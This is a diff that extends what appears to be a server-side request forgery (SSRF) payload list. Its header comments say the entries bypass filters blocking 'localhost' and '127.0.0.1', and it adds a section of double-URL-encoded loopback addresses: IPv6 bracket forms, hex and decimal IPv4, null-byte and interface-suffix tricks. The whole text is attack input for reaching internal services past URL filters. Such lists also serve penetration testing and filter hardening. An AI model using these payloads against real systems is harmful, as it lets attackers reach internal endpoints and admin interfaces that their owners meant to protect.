@@ -1,3 +1,6 @@
+#All the below payloads used to bypass basic filter `localhost, 127.0.0.1`
+#In other words, payload below will works as `localhost/ 127.0.0.1`
+#Note that some payloads only work in Windows/ Linux, some work both
 #=== SECTION A: Starts with `http://` + plain-text ===
 http://127.0.0.1/
 http://127.0.0.1:80/
@@ -114,3 +117,26 @@ http://%5B::ffff:127.0.0.1%5D/api
 http://%5B::ffff:127.0.0.1%5D:8080/
 http://%5B::1%5D:8080/admin
 http://127.0.0.1%2e/
+
+#=== SECTION D: Starts with `http://` + double URL encoded ===
+http://%255B::1%255D/
+http://%255B::1%255D:80/
+http://%255B::ffff:127.0.0.1%255D/
+http://%255B::ffff:7f00:1%255D/
+http://%255B::ffff:7f000001%255D/
+http://%255B::ffff:127.0.0.1%255D:8080/
+%255B::1%255D
+%255B::ffff:127.0.0.1%255D
+%255B0:0:0:0:0:0:0:1%255D
+http://%255B127.0.0.1%255D/
+http://%255B0x7f000001%255D/
+http://%255B2130706433%255D/
+http://%255B127.1%255D/
+%255B127.0.0.1%255D:80
+http://127.0.0.1%2500/
+http://%255B::1%255D%2525eth0/
+http://%255B::1%255D/;@example.com/
+http://%255B::ffff:127.0.0.1%255D/api
+http://%255B::ffff:127.0.0.1%255D:8080/
+http://%255B::1%255D:8080/admin
+http://127.0.0.1%252e/
